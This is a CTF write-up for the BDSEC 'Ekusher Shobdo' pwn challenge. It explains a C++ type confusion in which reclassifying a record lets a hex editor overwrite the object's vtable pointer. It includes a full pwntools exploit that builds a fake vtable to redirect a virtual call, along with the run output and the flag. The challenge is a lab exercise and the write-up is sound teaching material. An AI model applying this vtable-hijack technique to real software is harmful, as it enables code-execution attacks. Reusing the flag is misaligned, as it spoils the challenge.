
# Ekusher Shobdo — BDSEC CTF Writeup

**Category:** Pwn / C++  
**Author:** NomanProdhan  
**Flag:** `BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}`

## TL;DR

The program lets us create different kinds of archive records, then later “reclassify” them.

The funny part is, reclassifying only changes a normal integer field. It does **not** replace the actual C++ object.

When a record is classified as an imported archive, the edit option decodes our hex input straight into the object’s memory. That means we can overwrite the object’s vtable pointer.

The program also gives us a heap leak and a vtable leak, so PIE and ASLR are not really a problem.

We build a fake vtable inside the object, point the virtual `publish()` call at the hidden flag function, hit publish, and get the flag.

---

## First look

The challenge gives us a menu-based C++ binary for storing archive records like poems, slogans, notices, broadcasts, and imported archives.

The interesting actions are basically:

- create a record
- edit a record
- reclassify a record
- show metadata
- publish a record

Since this is C++, the different record types are implemented using classes and virtual functions.

Roughly, each slot looks like this:

```
struct Slot {
    Record *storage;
    int classification;
};
```

`storage` points to the real C++ object.

`classification` is just the category the program currently thinks the object belongs to.

Those two values can get out of sync.

---

## The bug

When we reclassify a record, the program only updates the classification number.

It does not destroy the old object and create a new object of the selected type.

So we can do this:

1. create a normal `Poem`
2. reclassify it as `Imported archive`
3. use the imported archive edit function on the original `Poem` object

The imported archive editor asks for raw bytes in hex and copies the decoded bytes directly into the object.

That gives us an arbitrary overwrite starting from the beginning of the heap object.

For a C++ object with virtual methods, the first 8 bytes are normally the vtable pointer.

So the first thing we can overwrite is:

```
object + 0x00 -> vtable pointer
```

After that, any virtual call can be redirected.

---

## Leaks

The metadata option prints something like:

```
storage=0x5cc0627ae2b0
dispatch=0x5cc0367b7c08
```

`storage` is the address of the heap object.

`dispatch` is the current vtable address.

From reversing the local binary, the poem vtable is at:

```
PIE base + 0x4c08
```

So PIE can be calculated with:

```
pie_base = dispatch - 0x4c08
```

The hidden function that reads and prints `flag.txt` is at:

```
PIE base + 0x1dd0
```

So:

```
flag_function = pie_base + 0x1dd0
```

Now we know:

- where the object is
- where the binary is loaded
- where the hidden flag routine is

Pretty much everything needed for the exploit.

---

## Fake vtable setup

The publish option eventually makes a virtual call similar to:

```
record->publish();
```

The `publish()` function pointer is loaded from:

```
[vtable + 0x08]
```

We can store a fake vtable inside the same heap object.

The layout used was:

```
object + 0x00: object + 0x08
object + 0x08: 0
object + 0x10: hidden flag function
```

So the first qword becomes a pointer to our fake vtable:

```
fake_vtable = object + 0x08
```

Then the entry used by `publish()` points to the hidden flag routine.

Visual version:

```
heap object
+--------------------------+
| fake_vtable pointer      |  object + 0x00
| -> object + 0x08         |
+--------------------------+
| unused fake entry        |  object + 0x08
| 0x0000000000000000       |
+--------------------------+
| fake publish entry       |  object + 0x10
| hidden flag function     |
+--------------------------+
```

After the overwrite, selecting publish calls the flag routine instead of the real poem publish method.

---

## Exploit

```
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./ekusher_shobdo", checksec=False)
context.log_level = "info"


def start():
    if args.REMOTE:
        return remote("45.56.67.129", 54821)

    return process(elf.path)


io = start()


def menu(choice):
    io.sendlineafter(b"> ", str(choice).encode())


# create record 0 as a poem
menu(1)
io.sendlineafter(b"Type: ", b"1")


# leak the heap object and poem vtable
menu(5)
io.sendlineafter(b"Record: ", b"0")

io.recvuntil(b"storage=")
storage = int(io.recvline().strip(), 16)

io.recvuntil(b"dispatch=")
dispatch = int(io.recvline().strip(), 16)


# calculate PIE and hidden flag routine
pie_base = dispatch - 0x4C08
flag_routine = pie_base + 0x1DD0

log.info(f"storage      = {storage:#x}")
log.info(f"dispatch     = {dispatch:#x}")
log.info(f"PIE base     = {pie_base:#x}")
log.info(f"flag routine = {flag_routine:#x}")


# only the external classification changes
# the actual object is still a poem
menu(3)
io.sendlineafter(b"Record: ", b"0")
io.sendlineafter(b"New classification: ", b"5")


# imported archive editing writes raw decoded bytes
# directly over the original C++ object
menu(2)
io.sendlineafter(b"Record: ", b"0")
io.recvuntil(b"Raw bytes (hex): ")

fake_vtable = storage + 8

payload = flat(
    fake_vtable,
    0,
    flag_routine,
)

io.sendline(payload.hex().encode())


# virtual publish call now lands in the hidden function
menu(6)
io.sendlineafter(b"Record: ", b"0")

io.recvuntil(b"[+] The language broadcast has been restored.\n")
flag = io.recvline().strip()

if not (flag.startswith(b"BDSEC{") and flag.endswith(b"}")):
    raise RuntimeError(f"unexpected output: {flag!r}")

log.success(flag.decode())
```

Run it with:

```
python3 exploit.py REMOTE
```

---

## Output

```
[+] Opening connection to 45.56.67.129 on port 54821: Done
[*] storage      = 0x5cc0627ae2b0
[*] dispatch     = 0x5cc0367b7c08
[*] PIE base     = 0x5cc0367b3000
[*] flag routine = 0x5cc0367b4dd0
[+] BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}
[*] Closed connection to 45.56.67.129 port 54821
```

---

## Flag

```
BDSEC{sh0bd0_k0kh0n0_b0nd1_th4k3_n4}
```

---

## Final thoughts

This was a nice little C++ type-confusion challenge.

The main issue was that the program trusted the classification field instead of the object’s real type. Once a normal object could be edited through the imported archive path, the vtable pointer was fully under our control.

The metadata leak made the rest pretty chill:

- heap leak gave the fake vtable address
- vtable leak gave the PIE base
- fake publish entry redirected execution
- hidden routine printed the flag

Clean bug, clean exploit, gg.

